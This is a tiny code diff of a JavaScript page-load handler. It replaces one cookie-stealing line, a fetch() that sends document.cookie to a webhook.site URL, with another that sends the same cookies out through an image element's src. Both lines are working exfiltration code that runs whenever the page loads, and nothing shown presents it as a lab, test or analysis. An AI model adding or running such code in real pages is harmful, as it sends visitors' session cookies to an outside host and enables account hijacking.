@@ -1,3 +1,3 @@
 window.onload = function() {
-  fetch("https://webhook.site/d9ec918f-5aca-4863-a11a-7c03a5148da9/log?c="+document.cookie)
+  document.getElementById("myImage").src = "https://webhook.site/2aa1a0b5-3476-4179-b56c-0f9555392f66?"+document.cookie;
 };
